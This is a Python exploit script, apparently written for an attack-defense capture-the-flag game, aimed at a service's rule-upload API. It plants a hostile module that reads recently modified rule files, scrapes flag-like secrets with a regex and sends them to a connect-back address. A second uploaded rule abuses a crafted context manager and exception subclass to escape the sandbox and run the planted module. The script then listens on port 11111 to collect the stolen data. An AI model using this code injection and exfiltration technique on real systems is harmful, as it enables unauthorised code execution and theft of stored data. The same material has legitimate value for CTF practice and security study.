#!/usr/bin/env python3

import sys
import socket
from common import call_get_rules_api, call_add_rule_api, call_check_user_api

MODULE_NAME = "SPL3_MODULE"
RULE_NAME = "SPL3_RULE"

host = sys.argv[1]
connectback_ip = sys.argv[2]

MODULE = """
import re
import pathlib
import socket

flags = []
for file in sorted(pathlib.Path("data/rules").iterdir(), key=lambda f: -f.lstat().st_mtime)[:300]:
    if file.is_file():
        flags += re.findall(r"[A-Za-z0-9]{31}=", file.read_text())

s = socket.socket()
s.connect(("%s", 11111))
s.sendall(repr(flags).encode())
""" % connectback_ip

PAYLOAD = """
__name__ = "data.rules.%s"
def exit(this, exc_type, exc_value, exc_traceback):
    raise type("E", (exc_type,), {})()
with type("C", (), {"__enter__": lambda s: None, "__exit__": exit})():
    pwn
""" % MODULE_NAME

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 11111))
s.listen()

call_add_rule_api(host, MODULE_NAME + ".py", MODULE)
call_add_rule_api(host, RULE_NAME, PAYLOAD)
call_check_user_api(host, [RULE_NAME], 0)

print(s.accept()[0].recv(10000))
